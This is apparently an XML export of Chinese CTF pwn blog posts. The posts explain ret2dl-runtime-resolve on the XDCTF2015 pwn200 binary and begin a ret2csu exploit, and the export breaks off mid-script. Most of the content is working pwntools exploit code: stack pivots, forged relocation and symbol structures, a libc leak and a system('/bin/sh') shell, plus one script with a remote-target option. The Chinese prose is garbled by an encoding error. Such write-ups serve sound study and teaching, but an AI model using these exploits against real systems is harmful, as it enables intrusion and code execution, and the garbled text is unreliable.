    <content type="text"><![CDATA[å‰è¨€ ä¸€æ­¥ä¸€æ­¥æž„å»º dl-runtime-resolveï¼Œè¯¦ç»†ç†è§£å…¶è§£æžè¿‡ç¨‹ å‚è€ƒ http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ å‚è€ƒ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/ elf æ–‡ä»¶é“¾æŽ¥ https://github.com/hitcxy/pwn-challenges/tree/master/study æ¼æ´žåˆ©ç”¨æ–¹å¼ æŽ§åˆ¶ eip ä¸º PLT[0] çš„åœ°å€ï¼Œåªéœ€ä¼ é€’ä¸€ä¸ª index_arg å‚æ•° æŽ§åˆ¶ index_arg çš„å¤§å°ï¼Œä½¿ reloc çš„ä½ç½®è½åœ¨å¯æŽ§åœ°å€å†… ä¼ªé€  reloc çš„å†…å®¹ï¼Œä½¿ sym è½åœ¨å¯æŽ§åœ°å€å†… ä¼ªé€  sym çš„å†…å®¹ï¼Œä½¿ name è½åœ¨å¯æŽ§åœ°å€å†… ä¼ªé€  name ä¸ºä»»æ„åº“å‡½æ•°ï¼Œå¦‚ system stage1 å…ˆæŠŠæ ˆè¿ç§»åˆ° bss ä¸Šï¼Œå¹¶è¿”å›ž write@plt 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stager.sendline(payload)cmd = "/bin/sh"payload2 = 'AAAA' # æŽ¥ä¸Šä¸€ä¸ªpayloadçš„leave-&gt;pop ebp ; retpayload2 += p32(write_plt)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage2 æŽ§åˆ¶ eip è¿”å›ž PLT[0] ï¼Œè¦å¸¦ä¸Š write çš„ index_offset 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write's indexpayload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage3 æŽ§åˆ¶ index_offset ï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬æž„é€ çš„ fake_reloc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380 # objdump -d -j .plt bofrel_plt = 0x08048330 # objdump -s -j .rel.plt bofindex_offset = (base_stage + 28) - rel_plt # base_stage + 28æŒ‡å‘fake_relocï¼Œå‡åŽ»rel_pltå³åç§»write_got = elf.got['write']r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage4 è¿™æ¬¡æž„é€  fake_sym ï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬æŽ§åˆ¶çš„ st_name 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf32_Symç»“æž„ä½“éƒ½æ˜¯0x10å­—èŠ‚å¤§å°fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # é™¤ä»¥0x10å› ä¸ºElf32_Symç»“æž„ä½“çš„å¤§å°ä¸º0x10ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å·r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)çš„ä½ç½®payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage5 æŠŠ st_name æŒ‡å‘è¾“å…¥çš„å­—ç¬¦ä¸² &quot;write&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # åŠ 0x10å› ä¸ºElf32_Symçš„å¤§å°ä¸º0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)çš„ä½ç½®payload2 += "write\x00"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive() stage6 æ›¿æ¢ write ä¸º system ï¼Œå¹¶ä¿®æ”¹ system çš„å‚æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding=utf-8#!/usr/bin/pythonfrom pwn import *elf = ELF('./main')offset = 112read_plt = elf.plt['read']write_plt = elf.plt['write']ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"stack_size = 0x800bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"base_stage = bss_addr + stack_sizer = process('./main')r.recvuntil('Welcome to XDCTF2015~!\n')payload = 'A' * offsetpayload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stager.sendline(payload)cmd = "/bin/sh"plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got['write']dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # åŠ 0x10å› ä¸ºElf32_Symçš„å¤§å°ä¸º0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(base_stage + 80)payload2 += 'B' * 4payload2 += 'B' * 4payload2 += fake_reloc # (base_stage+28)çš„ä½ç½®payload2 += 'B' * alignpayload2 += fake_sym # (base_stage+36)çš„ä½ç½®payload2 += "system\x00"payload2 += 'A' * (80 - len(payload2))payload2 += cmd + '\x00'payload2 += 'A' * (100 - len(payload2))r.sendline(payload2)r.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dl-runtime-resolve]]></title>
    <url>%2F2020%2Fdl-runtime-resolve%2F</url>
    <content type="text"><![CDATA[å‰è¨€ åœ¨Linuxä¸­å¦‚æžœç¨‹åºæƒ³è¦è°ƒç”¨å…¶å®ƒåŠ¨æ€é“¾æŽ¥åº“çš„å‡½æ•°ï¼Œå¿…é¡»è¦åœ¨ç¨‹åºåŠ è½½çš„æ—¶å€™åŠ¨æ€é“¾æŽ¥ï¼›åœ¨ä¸€ä¸ªç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯èƒ½å¾ˆå¤šå‡½æ•°åœ¨ç¨‹åºæ‰§è¡Œå®Œæ—¶éƒ½ä¸ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚ä¸€äº›é”™è¯¯å¤„ç†å‡½æ•°æˆ–è€…ä¸€äº›ç”¨æˆ·å¾ˆå°‘ç”¨åˆ°çš„åŠŸèƒ½æ¨¡å—ï¼Œæ‰€ä»¥ELFé‡‡ç”¨ä¸€ç§å«åšå»¶è¿Ÿç»‘å®š(Lazy Binding)çš„åšæ³•ï¼ŒåŸºæœ¬æ€æƒ³å°±æ˜¯å½“å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰è¿›è¡Œç»‘å®šï¼ˆç¬¦å·æŸ¥æ‰¾ã€é‡å®šä½ç­‰ï¼‰ï¼›è€Œåœ¨Linuxä¸­æ˜¯åˆ©ç”¨_dl_runtime_resolve(link_map_obj, reloc_index)å‡½æ•°æ¥å¯¹åŠ¨æ€é“¾æŽ¥çš„å‡½æ•°è¿›è¡Œé‡å®šä½çš„ã€‚ _dl_runtime_resolveå‡½æ•°å…·ä½“è¿è¡Œæ¨¡å¼ é¦–å…ˆç”¨link_mapè®¿é—®.dynamicï¼Œåˆ†åˆ«å–å‡º.dynstrã€.dynsymã€.rel.pltçš„åœ°å€ .rel.plt+å‚æ•°reloc_indexï¼Œæ±‚å‡ºå½“å‰å‡½æ•°çš„é‡å®šä½è¡¨é¡¹Elf32_Relçš„æŒ‡é’ˆï¼Œè®°ä½œrel rel-&gt;r_info &gt;&gt; 8 ä½œä¸º.dynsymçš„ä¸‹æ ‡ï¼Œæ±‚å‡ºå½“å‰å‡½æ•°çš„ç¬¦å·è¡¨é¡¹Elf32_Symçš„æŒ‡é’ˆï¼Œè®°ä½œsym .dynstr + sym-&gt;st_nameå¾—å‡ºç¬¦å·å å­—ç¬¦ä¸²æŒ‡é’ˆ åœ¨åŠ¨æ€é“¾æŽ¥åº“æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”æŠŠåœ°å€èµ‹å€¼ç»™*rel-&gt;r_offsetï¼Œå³GOTè¡¨ æœ€åŽè°ƒç”¨è¿™ä¸ªå‡½æ•° ä»¥putsä¸ºä¾‹è¿½è¸ªä¸€ä¸‹ELFæ–‡ä»¶libcå‡½æ•°è§£æžè¿‡ç¨‹call puts@plt siè¿›å…¥call puts@plt å› ä¸ºä¼šjmp dword ptr [0x804a00c]ï¼Œæ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹0x804a00cçš„å†…å®¹ï¼Œå­˜æ”¾çš„æ˜¯0x080482e6åœ°å€ï¼Œå…¶ä¸­0x080482e6æ˜¯puts@pltç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå³read@gotä¸­åˆå§‹å­˜æ”¾read@pltçš„ç¬¬äºŒæ¡æŒ‡ä»¤åœ°å€ jmp 0x80482d0 å…¶ä¸­ds:0x804a008å­˜æ”¾çš„æ˜¯_dl_runtime_resolveçš„åœ°å€ è¿™æ ·çš„è¯ï¼ŒåŠ ä¸Šä¹‹å‰çš„push 0ï¼Œå°±pushäº†ä¸¤ä¸ªå‚æ•°ï¼Œè¿™ä¸¤ä¸ªå‚æ•°åˆšå¥½æ˜¯_dl_runtime_resolve(link_map_obj, reloc_index)éœ€è¦çš„å‚æ•°ï¼Œå…¶ä¸­0x804a004å°±æ˜¯link_mapæŒ‡é’ˆï¼Œ0å°±æ˜¯reloc_index 12push 0push dword ptr [0x804a004] é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹é€šè¿‡è¿™ä¸¤ä¸ªå‚æ•°æ˜¯å¦‚ä½•æ‰¾åˆ°putså‡½æ•°çš„å‘¢ é¦–å…ˆæ‰¾åˆ°link_mapçš„åœ°å€ ç„¶åŽé€šè¿‡link_mapæ‰¾åˆ°.dynamicçš„åœ°å€ï¼Œå…¶ä¸­ç¬¬ä¸‰ä¸ªåœ°å€å°±æ˜¯.dynamicçš„åœ°å€ï¼Œå³0x8049f14 ç„¶åŽé€šè¿‡.dynamicæ¥æ‰¾åˆ°.dynstrã€.dynsymã€.rel.pltçš„åœ°å€.dynamicçš„åœ°å€åŠ 0x44çš„ä½ç½®æ˜¯.dynstr:[0x08049f14+0x44]=[0x08049f58]ï¼Œå³0x0804821c.dynamicçš„åœ°å€åŠ 0x4cçš„ä½ç½®æ˜¯.dynsym:[0x08049f14+0x4c]=[0x08049f60]ï¼Œå³0x080481cc.dynamicçš„åœ°å€åŠ 0x84çš„ä½ç½®æ˜¯.rel.plt:[0x08049f14+0x84]=[0x08049f98]ï¼Œå³0x08048298 ç„¶åŽç”¨.rel.pltçš„åœ°å€åŠ ä¸Šå‚æ•°reloc_indexï¼Œå³0x8048298+0=0x8048298æ‰¾åˆ°å‡½æ•°çš„é‡å®šä½è¡¨é¡¹Elf32_Relçš„æŒ‡é’ˆï¼Œè®°ä½œrel è¿™é‡Œrelä¸º0x8048298ï¼Œæ‰€ä»¥ 12r_offset = 0x804a00cr_info = 107h é€šè¿‡Elf32_relç»“æž„çš„r_info &gt;&gt; 8 = 107h &gt;&gt; 8 = 1 ä½œä¸º.dynsymä¸­çš„ä¸‹æ ‡ æŸ¥çœ‹0x80481dcå†…å­˜ï¼Œæ‰¾åˆ°putsåœ¨.dynstrè¡¨é¡¹ç´¢å¼•ä¸º0x1aï¼Œæ‰€ä»¥st_nameçš„åœ°å€ä¸º0x804821c+0x1a=0x8048236 æœ€åŽåœ¨åŠ¨æ€é“¾æŽ¥åº“æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”æŠŠåœ°å€èµ‹å€¼ç»™*rel-&gt;r_offsetï¼Œå³GOTè¡¨å°±å¯ä»¥äº† åˆ©ç”¨æ€è·¯ äº‹å®žä¸Šï¼Œè™šæ‹Ÿåœ°å€æ˜¯ä»Žst_nameå¾—æ¥çš„ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¿™ä¸ªst_nameçš„å†…å®¹å°±å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ï¼Œæ¯”å¦‚æŠŠst_nameçš„å†…å®¹ä¿®æ”¹ä¸º&quot;system&quot; reloc_indexå³å‚æ•°næ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„ï¼Œæˆ‘ä»¬éœ€è¦åšçš„äº‹é€šè¿‡ä¸€ç³»åˆ—æ“ä½œï¼ŒæŠŠreloc_indexå¯æŽ§è½¬åŒ–ä¸ºst_nameå¯æŽ§ï¼›æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªå¯å†™åœ°å€ä¸Šæž„é€ ä¸€ç³»åˆ—ä¼ªç»“æž„å°±å¯ä»¥å®Œæˆåˆ©ç”¨æˆ–åœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ç›´æŽ¥ä¿®æ”¹.dynstr æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºä¸­æ‰¾ä¸€æ®µç©ºé—´startå‡ºæ¥ï¼Œæ”¾æˆ‘ä»¬ç›´æŽ¥æž„é€ çš„fake_dynsymï¼Œfake_dynstrå’Œfake_rel_pltç­‰ï¼Œç„¶åŽåˆ©ç”¨æ ˆè¿ç§»åˆ°æ‰‹æ³•å°†æ ˆè½¬ç§»åˆ°start è®¡ç®—reloc_index relic_index = fake_rel_plt_addr - 0x804833c è®¡ç®—r_info r_infoçš„è®¡ç®—æ–¹æ³•æœ‰ä¸¤ä¸ªæ­¥éª¤ x = ï¼ˆæ¬²ä¼ªé€ çš„åœ°å€ - .dynsymåŸºåœ°å€ï¼‰/ 0x10 r_info = x &lt;&lt; 8 | 0x7 è®¡ç®—st_name st_name = fake_dynstr_addr - 0x804827c ä¾‹å­ï¼ˆè¿™é‡Œæœ‰XDCTF2015çš„ pwn200ï¼‰ æ–¹æ³•ä¸€ ç›´æŽ¥ä½¿ç”¨ write æ³„æ¼ libc ï¼Œç„¶åŽæ‰§è¡Œ system(&#39;/bin/sh&#39;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *local=1pc='./main'aslr=Truecontext.log_level=True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc=ELF('./libc6_2.27-3ubuntu1.2_i386.so')pwn200=ELF('./main')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr=['111.198.29.45', 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(p , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__': write_plt = pwn200.plt['write'] lg('write_plt', write_plt) write_got = pwn200.got['write'] lg('write_got', write_got) start_addr = pwn200.symbols['_start'] lg('start_addr', start_addr) ru("Welcome to XDCTF2015~!\n") payload = 'a'*0x6c payload += 'b'*4 payload += p32(write_plt) payload += p32(start_addr) payload += p32(1) payload += p32(write_got) payload += p32(4) sl(payload) write_addr = u32(rv(4)) lg('write_addr', write_addr) libc_base = write_addr - libc.symbols['write'] system_addr = libc_base + libc.symbols['system'] binsh_addr = libc_base + libc.search("/bin/sh").next() lg('libc_addr', libc_base) lg('system_addr', system_addr) lg('binsh_addr', binsh_addr) payload = 'a'*0x6c payload += 'b'*4 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sl(payload) pi() æ–¹æ³•äºŒ ç›´æŽ¥ä½¿ç”¨äº†roputilsåº“ï¼Œæ¯”è¾ƒç®€æ´ 123456789101112131415161718192021222324252627# coding=utf-8from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextprocessName = 'main'offset = 112r = process('./' + processName)context.log_level = 'debug'rop = ROP('./' + processName)bss_base = rop.section('.bss')buf = rop.fill(offset)buf += rop.call('read', 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string('/bin/sh')buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, 'system')buf += rop.fill(100, buf)r.send(buf)r.interactive() æ–¹æ³•ä¸‰ å…¶å®žä¸€æ­¥ä¸€æ­¥ä¼ªæž„é€ èƒ½æ›´å®¹æ˜“ç†è§£è¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒé«˜çº§ROP ret2dl_runtime ä¹‹é€šæ€è¯¦è§£å’ŒROPé«˜çº§ç”¨æ³•ä¹‹ret2_dl_runtime_resolve ä¸Šé¢æž„é€ çš„ROPå·¦è¾¹æ˜¯åšä¸€ä¸ªæ ˆçš„è¿ç§» å³è¾¹æ˜¯ä¼ªé€ çš„è§£æžé“¾ 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level = 'debug'context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']name = './main'p = process(name)elf= ELF(name)rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr #0x8048330dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr #0x80481d8dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr #0x8048278resolve_plt = 0x08048380leave_ret_addr = 0x0804851Dstart = 0x804aa00fake_rel_plt_addr = startfake_dynsym_addr = fake_rel_plt_addr + 0x8fake_dynstr_addr = fake_dynsym_addr + 0x10bin_sh_addr = fake_dynstr_addr + 0x8#n index_argn = fake_rel_plt_addr - rel_plt_addrr_info = (((fake_dynsym_addr - dynsym_addr)/0x10) &lt;&lt; 8) + 0x7str_offset = fake_dynstr_addr - dynstr_addrfake_rel_plt = p32(elf.got['read']) + p32(r_info)fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)fake_dynstr = "system"+'\x00'+'\x00'fake_dynstr += "/bin/sh"+'\x00'pay1 = 'a'*108 + p32(start - 20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)p.recvuntil('Welcome to XDCTF2015~!\n')p.sendline(pay1)pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + 'aaaa' + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstrp.sendline(pay2)success(".rel_plt: " + hex(rel_plt_addr))success(".dynsym: " + hex(dynsym_addr))success(".dynstr: " + hex(dynstr_addr))success("fake_rel_plt_addr: " + hex(fake_rel_plt_addr))success("fake_dynsym_addr: " + hex(fake_dynsym_addr))success("fake_dynstr_addr: " + hex(fake_dynstr_addr))success("n: " + hex(n))success("r_info: " + hex(r_info))success("offset: " + hex(str_offset))success("system_addr: " + hex(fake_dynstr_addr))success("bss_addr: " + hex(elf.bss()))p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2csu]]></title>
    <url>%2F2020%2Fret2csu%2F</url>
    <content type="text"><![CDATA[ctf-wiki ä¸­ ret2csu ï¼Œå¯¹äºŽ 64 ä½ç¨‹åºï¼Œè¯¦ç»†å‚è€ƒ ctf-wiki æˆ‘çš„æµ‹è¯•çŽ¯å¢ƒä¸º ubuntu18.04 ï¼Œå› ä¸ºè¿™ä¸ªçŽ¯å¢ƒå¡äº†å¥½ä¹…ï¼Œå¤šäº†ä¸€æ¡æŒ‡ä»¤ï¼Œæœ€åŽæ€»æ˜¯è·³ä¸è¿‡åŽ» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from pwn import *local=1pc=&apos;./level5&apos;aslr=Truecontext.log_level=True#context.terminal = [&quot;deepin-terminal&quot;,&quot;-x&quot;,&quot;sh&quot;,&quot;-c&quot;]libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)level5 = ELF(&apos;./level5&apos;)if local==1: #p = process(pc,aslr=aslr,env=&#123;&apos;LD_PRELOAD&apos;: &apos;./libc.so.6&apos;&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,&apos;c&apos;)else: remote_addr=[&apos;111.198.29.45&apos;, 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =&quot;&quot;): gdb.attach(p , b) raw_input()def lg(s, addr): log.info(&apos;\033[1;31;40m %s --&gt; 0x%x \033[0m&apos; % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,&apos;\x00&apos;)) else: return u64(rl().strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))csu_front_addr = 0x400600csu_end_addr = 0x40061adef csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = &apos;a&apos;*0x80 payload += &apos;b&apos;*8 payload += p64(csu_end_addr) payload += p64(rbx) payload += p64(rbp) payload += p64(r12) payload += p64(r13) payload += p64(r14) payload += p64(r15) payload += p64(csu_front_addr) payload += &apos;c&apos;*0x38 payload += p64(last) sl(payload) sleep(1)if __name__ == 